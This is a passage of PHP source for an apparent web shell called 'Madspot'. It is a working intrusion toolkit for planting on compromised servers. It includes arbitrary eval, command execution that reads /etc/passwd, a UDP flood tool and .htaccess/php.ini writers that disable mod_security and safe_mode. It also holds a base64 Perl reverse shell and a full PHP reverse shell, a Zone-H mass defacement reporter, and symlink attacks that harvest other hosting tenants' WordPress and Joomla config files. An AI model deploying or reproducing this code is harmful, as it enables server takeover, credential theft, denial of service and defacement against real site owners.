			echo '<script>p3_="";</script><form onsubmit="g(null,null,null,null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input type=submit value=">>"></form>';
			break;
		case 'edit':
			if( !is_writable($_POST['p1'])) {
				echo 'File isn\'t writeable';
				break;
			}
			if( !empty($_POST['p3']) ) {
				$time = @filemtime($_POST['p1']);
				$_POST['p3'] = substr($_POST['p3'],1);
				$fp = @fopen($_POST['p1'],"w");
				if($fp) {
					@fwrite($fp,$_POST['p3']);
					@fclose($fp);
					echo 'Saved!<br><script>p3_="";</script>';
					@touch($_POST['p1'],$time,$time);
				}
			}
			echo '<form onsubmit="g(null,null,null,null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea>';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</textarea><input type=submit value=">>"></form>';
			break;
		case 'hexdump':
			$c = @file_get_contents($_POST['p1']);
			$n = 0;
			$h = array('00000000<br>','','');
			$len = strlen($c);
			for ($i=0; $i<$len; ++$i) {
				$h[1] .= sprintf('%02X',ord($c[$i])).' ';
				switch ( ord($c[$i]) ) {
					case 0:  $h[2] .= ' '; break;
					case 9:  $h[2] .= ' '; break;
					case 10: $h[2] .= ' '; break;
					case 13: $h[2] .= ' '; break;
					default: $h[2] .= $c[$i]; break;
				}
				$n++;
				if ($n == 32) {
					$n = 0;
					if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
					$h[1] .= '<br>';
					$h[2] .= "\n";
				}
		 	}
			echo '<table cellspacing=1 cellpadding=5 bgcolor=black><tr><td bgcolor=gray><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#282828><pre>'.$h[1].'</pre></td><td bgcolor=#333333><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
			break;
		case 'rename':
			if( !empty($_POST['p3']) ) {
				if(!@rename($_POST['p1'], $_POST['p3']))
					echo 'Can\'t rename!<br>';
				else
					die('<script>g(null,null,"'.urlencode($_POST['p3']).'",null,"")</script>');
			}
			echo '<form onsubmit="g(null,null,null,null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input type=submit value=">>"></form>';
			break;
		case 'touch':
			if( !empty($_POST['p3']) ) {
				$time = strtotime($_POST['p3']);
				if($time) {
					if(!touch($_POST['p1'],$time,$time))
						echo 'Fail!';
					else
						echo 'Touched!';
				} else echo 'Bad time format!';
			}
			clearstatcache();
			echo '<script>p3_="";</script><form onsubmit="g(null,null,null,null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value=">>"></form>';
			break;
	}
	echo '</div>';
	madFooter();
}  

function madphpeval()
{
    madhead();
    
    if(isset($_POST['p2']) && ($_POST['p2'] == 'ini')) {
		echo '<div class=header>';
		ob_start();
		$INI=ini_get_all(); 
print '<table border=0><tr>'
	.'<td class="listing"><font class="highlight_txt">Param</td>'
	.'<td class="listing"><font class="highlight_txt">Global value</td>'
	.'<td class="listing"><font class="highlight_txt">Local Value</td>'
	.'<td class="listing"><font class="highlight_txt">Access</td></tr>';
foreach ($INI as $param => $values) 
	print "\n".'<tr>'
		.'<td class="listing"><b>'.$param.'</td>'
		.'<td class="listing">'.$values['global_value'].' </td>'
		.'<td class="listing">'.$values['local_value'].' </td>'
		.'<td class="listing">'.$values['access'].' </td></tr>';
		$tmp = ob_get_clean();
        $tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$tmp);
		$tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
		echo str_replace('<h1','<h2', $tmp) .'</div><br>';
	}
    
    if(isset($_POST['p2']) && ($_POST['p2'] == 'info')) {
		echo '<div class=header><style>.p {color:#000;}</style>';
		ob_start();
		phpinfo();
		$tmp = ob_get_clean();
        $tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$tmp);
		$tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
		echo str_replace('<h1','<h2', $tmp) .'</div><br>';
	}
    
    if(isset($_POST['p2']) && ($_POST['p2'] == 'exten')) {
		echo '<div class=header>';
		ob_start();
	     $EXT=get_loaded_extensions ();
     print '<table border=0><tr><td class="listing">'
	.implode('</td></tr>'."\n".'<tr><td class="listing">', $EXT)
	.'</td></tr></table>'
	.count($EXT).' extensions loaded';
		
        
        echo '</div><br>';
	}
    
    
	if(empty($_POST['ajax']) && !empty($_POST['p1']))
		$_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;
    echo '<div class=header><Center><a href=# onclick="g(\'phpeval\',null,\'\',\'ini\')">| INI_INFO | </a><a href=# onclick="g(\'phpeval\',null,\'\',\'info\')">    | phpinfo |</a><a href=# onclick="g(\'phpeval\',null,\'\',\'exten\')">   | extensions  |</a></center><br><form name=pf method=post onsubmit="g(\'phpeval\',null,this.code.value,\'\'); return false;"><textarea name=code class=bigarea id=PhpCode>'.(!empty($_POST['p1'])?htmlspecialchars($_POST['p1']):'').'</textarea><center><input type=submit value=Eval style="margin-top:5px"></center>';
	echo '</form><pre id=PhpOutput style="'.(empty($_POST['p1'])?'display:none;':'').'margin-top:5px;" class=ml1>';
	if(!empty($_POST['p1'])) {
		ob_start();
		eval($_POST['p1']);
		echo htmlspecialchars(ob_get_clean());
	}
	echo '</pre></div>';
  
    madfooter();
}

function madhash()
{
    if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
    if(!function_exists('binhex')) {function binhex($p) {return dechex(bindec($p));}}
	if(!function_exists('hex2ascii')) {function hex2ascii($p){$r='';for($i=0;$i<strLen($p);$i+=2){$r.=chr(hexdec($p[$i].$p[$i+1]));}return $r;}}
	if(!function_exists('ascii2hex')) {function ascii2hex($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= sprintf('%02X',ord($p[$i]));return strtoupper($r);}}
	if(!function_exists('full_urlencode')) {function full_urlencode($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= '%'.dechex(ord($p[$i]));return strtoupper($r);}}
	$stringTools = array(
		'Base64 encode' => 'base64_encode',
		'Base64 decode' => 'base64_decode',
        'md5 hash' => 'md5',
		'sha1 hash' => 'sha1',
		'crypt' => 'crypt',
		'CRC32' => 'crc32',
		'Url encode' => 'urlencode',
		'Url decode' => 'urldecode',
		'Full urlencode' => 'full_urlencode',
		'Htmlspecialchars' => 'htmlspecialchars',
		
	);
	
	madhead();
	echo '<div class=header>';
	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
	echo "<form  onSubmit='g(null,null,this.selectTool.value,this.input.value); return false;'><select name='selectTool'>";
	foreach($stringTools as $k => $v)
		echo "<option value='".htmlspecialchars($v)."'>".$k."</option>";
		echo "</select><input type='submit' value='>>'/><br><textarea name='input' style='margin-top:5px' class=bigarea>".(empty($_POST['p1'])?'':htmlspecialchars(@$_POST['p2']))."</textarea></form><pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' id='strOutput'>";
	if(!empty($_POST['p1'])) {
		if(in_array($_POST['p1'], $stringTools))echo htmlspecialchars($_POST['p1']($_POST['p2']));
	}
	echo "</div>";
	madFooter();
    
}
function maddos()
{
    madhead();
    echo '<div class=header>';
  if(empty($_POST['ajax'])&&!empty($_POST['p1']))
  $_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
  echo '<center><span>| UDP DOSSIER |</span><br><br><form onSubmit="g(null,null,this.udphost.value,this.udptime.value,this.udpport.value); return false;" method=POST><span>Host :</span><input name="udphost" type="text"  size="25" /><span>Time :</span><input name="udptime" type="text" size="15" /><span>Port :</span><input name="udpport" type="text" size="10" /><input  type="submit" value=">>" /></form></center>';
  echo "<pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' >";
    if(!empty($_POST['p1']) && !empty($_POST['p2']) && !empty($_POST['p3']))
    {
         $packets=0;
        ignore_user_abort(true);
        $exec_time=$_POST['p2'];
        $time=time();
        $max_time=$exec_time+$time;
        $host=$_POST['p1'];
        $portudp=$_POST['p3'];
        for($i=0;$i<65000;$i++)
        {
            $out .= 'X';
        }
        while(1){
    
         $packets++;
            if(time() > $max_time){
                    break;
            }
            
            $fp = fsockopen('udp://'.$host, $portudp, $errno, $errstr, 5);
            if($fp){
                    fwrite($fp, $out);
                    fclose($fp);
            }
            }
         echo "$packets (" . round(($packets*65)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second";
         echo "</pre>";
    }
    
    echo '</div>'; 
   
    madfooter();        
}

function madproc()
{
    madhead();
    echo "<Div class=header><center>";
    if(empty($_POST['ajax'])&&!empty($_POST['p1']))
  $_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
  if($GLOBALS['sys']=="win")
  {
    $process=array(
    "System Info" =>"systeminfo",
    "Active Connections" => "netstat -an",
 	"Running Services" => "net start",
 	"User Accounts" => "net user",
 	"Show Computers" => "net view",
    "ARP Table" => "arp -a",
    "IP Configuration" => "ipconfig /all"
    );
    }
  else
  { 
    $process=array(
    "Process status" => "ps aux",
    "Syslog" =>"cat  /etc/syslog.conf",
    "Resolv" => "cat  /etc/resolv.conf",
    "Hosts" =>"cat /etc/hosts",
    "Passwd" =>"cat /etc/passwd",
    "Cpuinfo"=>"cat /proc/cpuinfo",
    "Version"=>"cat /proc/version",
    "Sbin"=>"ls -al /usr/sbin",
    "Interrupts"=>"cat /proc/interrupts",
    "lsattr"=>"lsattr -va",
    "Uptime"=>"uptime",
    "Fstab" =>"cat /etc/fstab",
    "HDD Space" => "df -h"
    );}
    
    foreach($process as $n => $link)
    {
        echo '<a href="#" onclick="g(null,null,\''.$link.'\')"> | '.$n.' | </a>';
    }
    echo "</center>"; 
     if(!empty($_POST['p1']))
     {
        echo "<pre class='ml1' style='margin-top:5px' >";
        echo madEx($_POST['p1']);
        echo '</pre>';
     }
     echo "</div>";
     madfooter();
     }
     
function madsafe()
{
    madhead();
    echo "<div class=header><center><h3><span>| SAFE MODE AND MOD SECURITY DISABLED AND PERL 500 INTERNAL ERROR BYPASS |</span></h3>Following php.ini and .htaccess(mod) and perl(.htaccess)[convert perl extention *.pl => *.sh  ] files create in following dir<br>| ".$GLOBALS['cwd']." |<br>";
    echo '<a href=# onclick="g(null,null,\'php.ini\',null)">| PHP.INI | </a><a href=# onclick="g(null,null,null,\'ini\')">| .htaccess(Mod) | </a><a href=# onclick="g(null,null,null,null,\'sh\')">| .htaccess(perl) | </a></center>';
    if(!empty($_POST['p2']) && isset($_POST['p2']))
    {
    $fil=fopen($GLOBALS['cwd'].".htaccess","w");
    fwrite($fil,'<IfModule mod_security.c>
Sec------Engine Off
Sec------ScanPOST Off
</IfModule>');
    fclose($fil);
   }
   if(!empty($_POST['p1'])&& isset($_POST['p1']))
   {
    $fil=fopen($GLOBALS['cwd']."php.ini","w");
      fwrite($fil,'safe_mode=OFF
disable_functions=NONE');
     fclose($fil);
    }
    if(!empty($_POST['p3']) && isset($_POST['p3']))
    {
    $fil=fopen($GLOBALS['cwd'].".htaccess","w");
    fwrite($fil,'Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .sh
AddHandler cgi-script .pl
AddHandler cgi-script .pl');
     fclose($fil); 
    }
    echo "<br></div>";
    madfooter();
    
}

function madconnect()
{
 madhead();
 $back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
 echo "<div class=header><center><h3><span>| PERL AND PHP(threads) BACK CONNECT |</span></h3>";
 echo "<form  onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\"><span>PERL BACK CONNECT</span><br>IP: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' value='443'> <input type=submit value='>>'></form>";
 echo "<br><form  onSubmit=\"g(null,null,'php',this.server.value,this.port.value);return false;\"><span>PHP BACK CONNECT</span><br>IP: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' value='443'> <input type=submit value='>>'></form></center>";
 if(isset($_POST['p1'])) {
		function cf($f,$t) {
			$w = @fopen($f,"w") or @function_exists('file_put_contents');
			if($w){
				@fwrite($w,@base64_decode($t));
				@fclose($w);
			}
		}
		if($_POST['p1'] == 'bcp') {
			cf("/tmp/bc.pl",$back_connect_p);
			$out = madEx("perl /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." 1>/dev/null 2>&1 &");
			echo "<pre class=ml1 style='margin-top:5px'>Successfully opened reverse shell to ".$_POST['p2'].":".$_POST['p3']."<br>Connecting...</pre>";
            @unlink("/tmp/bc.pl");
		}
        if($_POST['p1']=='php')
 {
            
@set_time_limit (0);
$ip = $_POST['p2']; 
$port =$_POST['p3'];     
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
echo "<pre class=ml1 style='margin-top:5px'>";

if (function_exists('pcntl_fork')) {
	
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		echo "Cant fork!<br>";
		exit(1);
	}
	
	if ($pid) {
		exit(0);  
	}

	if (posix_setsid() == -1) {
		echo "Error: Can't setsid()<br>";
		exit(1);
	}

	$daemon = 1;
} else {
	echo "WARNING: Failed to daemonise.  This is quite common and not fatal<br>";
}

chdir("/");

umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	echo "$errstr ($errno)";
	exit(1);
}


$descriptorspec = array(
   0 => array("pipe", "r"),  
   1 => array("pipe", "w"),  
   2 => array("pipe", "w")   
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	echo "ERROR: Can't spawn shell<br>";
	exit(1);
}


@stream_set_blocking($pipes[0], 0);
@stream_set_blocking($pipes[1], 0);
@stream_set_blocking($pipes[2], 0);
@stream_set_blocking($sock, 0);

echo "Successfully opened reverse shell to $ip:$port<br>";

while (1) {
	if (feof($sock)) {
		echo "ERROR: Shell connection terminated<br>";
		break;
	}

	if (feof($pipes[1])) {
		echo "ERROR: Shell process terminated<br>";
		break;
	}

	
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets=@stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) echo "SOCK READ<br>";
		$input=fread($sock, $chunk_size);
		if ($debug) echo "SOCK: $input<br>";
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) echo "STDOUT READ<br>";
		$input = fread($pipes[1], $chunk_size);
		if ($debug) echo "STDOUT: $input<br>";
		fwrite($sock, $input);
	}

	
	if (in_array($pipes[2], $read_a)) {
		if ($debug) echo "STDERR READ<br>";
		$input = fread($pipes[2], $chunk_size);
		if ($debug) echo "STDERR: $input<br>";
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

echo "</pre>";
}

}   
 echo "</div>";
 madfooter();
}
function ZoneH($url, $hacker, $hackmode,$reson, $site )
{
	$k = curl_init();
	curl_setopt($k, CURLOPT_URL, $url);
	curl_setopt($k,CURLOPT_POST,true);
	curl_setopt($k, CURLOPT_POSTFIELDS,"defacer=".$hacker."&domain1=". $site."&hackmode=".$hackmode."&reason=".$reson);
	curl_setopt($k,CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($k, CURLOPT_RETURNTRANSFER, true);
	$kubra = curl_exec($k);
	curl_close($k);
	return $kubra;
}
function madzoneh()
{
    madhead();
    if(!function_exists('curl_version'))
    {
        echo "<pre class=ml1 style='margin-top:5px'><center><font color=red>PHP CURL NOT EXIT</font></center></pre>";
    }
    echo "<div class=header><center><br>";
    echo '<h3><span>|ZONE-H MASS DEFACER |</span></h3>
    <form  onSubmit="g(null,null,this.defacer.value,this.hackmode.value,this.domain.value);return false;" >
    <span>| Notifier |</span><br>
<input type="text" name=defacer size="40" value="Attacker" /><br>
<select name=hackmode>
<option >--------SELECT--------</option>
<option value="1">known vulnerability (i.e. unpatched system)</option>
<option value="2" >undisclosed (new) vulnerability</option>
<option value="3" >configuration / admin. mistake</option>
<option value="4" >brute force attack</option>
<option value="5" >social engineering</option>
<option value="6" >Web Server intrusion</option>
<option value="7" >Web Server external module intrusion</option>
<option value="8" >Mail Server intrusion</option>
<option value="9" >FTP Server intrusion</option>
<option value="10" >SSH Server intrusion</option>
<option value="11" >Telnet Server intrusion</option>
<option value="12" >RPC Server intrusion</option>
<option value="13" >Shares misconfiguration</option>
<option value="14" >Other Server intrusion</option>
<option value="15" >SQL Injection</option>
<option value="16" >URL Poisoning</option>
<option value="17" >File Inclusion</option>
<option value="18" >Other Web Application bug</option>
<option value="19" >Remote administrative panel access bruteforcing</option>
<option value="20" >Remote administrative panel access password guessing</option>
<option value="21" >Remote administrative panel access social engineering</option>
<option value="22" >Attack against administrator(password stealing/sniffing)</option>
<option value="23" >Access credentials through Man In the Middle attack</option>
<option value="24" >Remote service password guessing</option>
<option value="25" >Remote service password bruteforce</option>
<option value="26" >Rerouting after attacking the Firewall</option>
<option value="27" >Rerouting after attacking the Router</option>
<option value="28" >DNS attack through social engineering</option>
<option value="29" >DNS attack through cache poisoning</option>
<option value="30" >Not available</option>
</select><br>
<select  >
<option >Not available</option>
<option value="1" >Heh...just for fun!</option>
<option value="2" >Revenge against that website</option>
<option value="3" >Political reasons</option>
<option value="4" >As a challenge</option>
<option value="5" >I just want to be the best defacer</option>
<option value="6" >Patriotism</option>
<option value="7" >Not available</option>
</select><br>
<textarea name=domain cols="50" rows="15">List Of Domains</textarea>
<br>
<input type="submit" value=">>" /></form>';
if(isset($_POST['p1']) && isset($_POST['p2']))
{
    $hacker =$_POST['p1'];
    $method =$_POST['p2'];
    $neden ="Not available";
    $site =$_POST['p3'];
   $i = 0;
   $sites = explode("\n", $site);
   echo "<pre class=ml1 style='margin-top:5px'>";
	while($i < count($sites)) 
	{
	if(substr($sites[$i], 0, 4) != "http") 
	{
			$sites[$i] = "http://".$sites[$i];
	}
	ZoneH("http://zone-h.org/notify/single", $hacker, $method, $neden, $sites[$i]);
	echo "Site : ".$sites[$i]." Defaced !<br>";
	++$i;
	}
     
    "Sending Sites To Zone-H Has Been Completed Successfully !! </pre>";
}
echo "</div>";
madfooter();
    
}
function madspot()
{
    madhead();
    echo "<div class=header>";
    echo "<pre>
    
                           |`-:_
  ,----....____            |    `+.                                                           
 (             ````----....|___   |
  \     _                      ````----....____
   \    _)  Coded By: Ikram Ali                ```---.._                       
    \                                                   \ 
  )`.\  )`.   )`.   )`.   )`.   )`.   )`.   )`.   )`.   )`.   )hh
-'   `-'   `-'   `-'   `-'   `-'   `-'   `-'   `-'   `-'   `-'   `
   Madspot is a Team of professional Ethical Hackers From Pakistan.
   We have Years of  Experience in  Security, Penetration & Coding 
   And can Break and Secure.
   
   Version 1.0
   
   Contact : http://www.madspot.net
   
   if you found bug contact our team 
   
   


              .=''=.             
             / _  _ \
            |  d  b  |
            \   /\   / 
           ,/'-=\/=-'\,
          / /        \ \     -----------------------------
         | / Zahid    \ |    Madspot Digital Security Team
         \/ \ Rasheed/ \/    -----------------------------
             '.    .'
             _|`~~`|_
             /|\  /|\    
	
       .- <O> -.        .-====-.      ,-------.      .-=<>=-.
   /_-\'''/-_\      / / '' \ \     |,-----.|     /__----__\
  |/  o) (o  \|    | | ')(' | |   /,'-----'.\   |/ (')(') \|
   \   ._.   /      \ \    / /   {_/(') (')\_}   \   __   /
   ,>-_,,,_-<.       >'=jf='<     `.   _   .'    ,'--__--'.
 / Waqar.Khan  \    /        \     /'-___-'\    /    :|    \
(_)     .     (_)  /  Ikram   \   / M-Usman \  (_)   :|   (_)
 \_-----'____--/  (_)  Ali   (_) (_)_______(_)   |___:|____|
  \___________/     |________|     \_______/     | Afrasiab|


	
  
  
    </pre></div>";
    madfooter();
    
    }
    
function madsymlink()
{
    madhead();
    
$IIIIIIIIIIIl = 'http://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
$IIIIIIIIIII1=explode('/',$IIIIIIIIIIIl );
$IIIIIIIIIIIl =str_replace($IIIIIIIIIII1[count($IIIIIIIIIII1)-1],'',$IIIIIIIIIIIl );  
    
    
    

   echo '<div class=header><script>p1_=p2_=p3_="";</script><br><center><h3><a href=# onclick="g(\'symlink\',null,\'website\',null)">| Domains | </a><a href=# onclick="g(\'symlink\',null,null,\'whole\')">| Whole Server Symlink | </a><a href=# onclick="g(\'symlink\',null,null,null,\'config\')">| Config PHP symlink | </a></h3></center>';
    
    if(isset($_POST['p1']) && $_POST['p1']=='website')
    {
        echo "<center>";
        $d0mains = @file("/etc/named.conf");
        if(!$d0mains){ echo "<pre class=ml1 style='margin-top:5px'>Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; }

 

echo "<table align=center class='main'  border=0  >

<tr bgcolor=Red><td>Count</td><td>domains</td><td>users</td></tr>";
$count=1;
foreach($d0mains as $d0main){

if(@eregi("zone",$d0main)){

preg_match_all('#zone "(.*)"#', $d0main, $domains);

flush();

if(strlen(trim($domains[1][0])) > 2){

$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));

echo "<tr><td>".$count."</td><td><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>"; flush();
$count++;
}}}
echo "</center></table>"; 
 }
 
 if(isset($_POST['p2']) && $_POST['p2']=='whole')
 {
    
    
    @set_time_limit(0);
    
    echo "<center>";
    
  
        
@mkdir('sym',0777);
$IIIIIIIIIIl1  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$IIIIIIIIII1I =@fopen ('sym/.htaccess','w');
fwrite($IIIIIIIIII1I ,$IIIIIIIIIIl1);
@symlink('/','sym/root');
$IIIIIIIIIlIl = basename('_FILE_');
    
    
$IIIIIIIIIllI = @file('/etc/named.conf');
if(!$IIIIIIIIIllI)
{
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; 
}
else
{
echo "<table align='center' width='40%' class='main'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($IIIIIIIIIllI as $IIIIIIIIIll1){
if(@eregi('zone',$IIIIIIIIIll1)){
preg_match_all('#zone "(.*)"#',$IIIIIIIIIll1,$IIIIIIIIIl11);
flush();
if(strlen(trim($IIIIIIIIIl11[1][0])) >2){
$IIIIIIIII1I1 = posix_getpwuid(@fileowner('/etc/valiases/'.$IIIIIIIIIl11[1][0]));
$IIIIIIII1I1l = $IIIIIIIII1I1['name'] ;
@symlink('/','sym/root');
$IIIIIIII1I1l = $IIIIIIIIIl11[1][0];
$IIIIIIII1I11 = '\.ir';
$IIIIIIII1lII = '\.il';
if (@eregi("$IIIIIIII1I11",$IIIIIIIIIl11[1][0]) or @eregi("$IIIIIIII1lII",$IIIIIIIIIl11[1][0]) )
{
$IIIIIIII1I1l = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$IIIIIIIIIl11[1][0].'</div>';
}
echo "
<tr>

<td>
<a target='_blank' href=http://www.".$IIIIIIIIIl11[1][0].'/>'.$IIIIIIII1I1l.' </a>
</td>

<td>
'.$IIIIIIIII1I1['name']."
</td>

<td>
<a href='sym/root/home/".$IIIIIIIII1I1['name']."/public_html' target='_blank'>symlink </a>
</td>


</tr>";
flush();
}
}
}
}
    
echo "</center></table>";    
    
 }
 
 
 
 if(isset($_POST['p3']) && $_POST['p3']=='config')
 
 
 {
  echo "<center>";
@mkdir('sym',0777);
$IIIIIIIIIIl1  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$IIIIIIIIII1I =@fopen ('sym/.htaccess','w');
@fwrite($IIIIIIIIII1I ,$IIIIIIIIIIl1);
@symlink('/','sym/root');
$IIIIIIIIIlIl = basename('_FILE_');
  
   
   $IIIIIIIIIllI = @file('/etc/named.conf');
if(!$IIIIIIIIIllI)
{
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>";
}
else
{
echo "
<table align='center' width='40%' class='main' ><td> Domains </td><td> Script </td>";
foreach($IIIIIIIIIllI as $IIIIIIIIIll1){
if(@eregi('zone',$IIIIIIIIIll1)){
preg_match_all('#zone "(.*)"#',$IIIIIIIIIll1,$IIIIIIIIIl11);
flush();
if(strlen(trim($IIIIIIIIIl11[1][0])) >2){
$IIIIIIIII1I1 = posix_getpwuid(@fileowner('/etc/valiases/'.$IIIIIIIIIl11[1][0]));
$IIIIIIIII1l1=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/wp-config.php';
$IIIIIIIII11I=get_headers($IIIIIIIII1l1);
$IIIIIIIII11l=$IIIIIIIII11I[0];
$IIIIIIIII111=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/blog/wp-config.php';
$IIIIIIIIlIII=get_headers($IIIIIIIII111);
$IIIIIIIIlIIl=$IIIIIIIIlIII[0];
$IIIIIIIIlII1=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/configuration.php';
$IIIIIIIIlIlI=get_headers($IIIIIIIIlII1);
$IIIIIIIIlIll=$IIIIIIIIlIlI[0];
$IIIIIIIIlIl1=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/joomla/configuration.php';
$IIIIIIIIlI1I=get_headers($IIIIIIIIlIl1);
$IIIIIIIIlI1l=$IIIIIIIIlI1I[0];
$IIIIIIIIlI11=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/includes/config.php';
$IIIIIIIIllII=get_headers($IIIIIIIIlI11);
$IIIIIIIIllIl=$IIIIIIIIllII[0];
$IIIIIIIIllI1=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/vb/includes/config.php';
$IIIIIIIIlllI=get_headers($IIIIIIIIllI1);
$IIIIIIIIllll=$IIIIIIIIlllI[0];
$IIIIIIIIlll1=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/forum/includes/config.php';
$IIIIIIIIll1I=get_headers($IIIIIIIIlll1);
$IIIIIIIIll1l=$IIIIIIIIll1I[0];
$IIIIIIIIll11=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'public_html/clients/configuration.php';
$IIIIIIIIl1II=get_headers($IIIIIIIIll11);
$IIIIIIIIl1Il=$IIIIIIIIl1II[0];
$IIIIIIIIl1I1=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/support/configuration.php';
$IIIIIIIIl1II=get_headers($IIIIIIIIl1I1);
$IIIIIIIIl1lI=$IIIIIIIIl1II[0];
$IIIIIIIIl1ll=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/client/configuration.php';
$IIIIIIIIl1l1=get_headers($IIIIIIIIl1ll);
$IIIIIIIIl11I=$IIIIIIIIl1l1[0];
$IIIIIIIIl11l=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/submitticket.php';
$IIIIIIIIl111=get_headers($IIIIIIIIl11l);
$IIIIIIII1III=$IIIIIIIIl111[0];
$IIIIIIII1IIl=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/client/configuration.php';
$IIIIIIII1II1=get_headers($IIIIIIII1IIl);
$IIIIIIII1IlI=$IIIIIIII1II1[0];
$IIIIIIII1Ill = strpos($IIIIIIIII11l,'200');
$IIIIIIII1I1I='&nbsp;';
if (strpos($IIIIIIIII11l,'200') == true )
{
$IIIIIIII1I1I="<a href='".$IIIIIIIII1l1."' target='_blank'>Wordpress</a>";
}
elseif (strpos($IIIIIIIIlIIl,'200') == true)
{
$IIIIIIII1I1I="<a href='".$IIIIIIIII111."' target='_blank'>Wordpress</a>";
}
elseif (strpos($IIIIIIIIlIll,'200')  == true and strpos($IIIIIIII1III,'200')  == true )
{
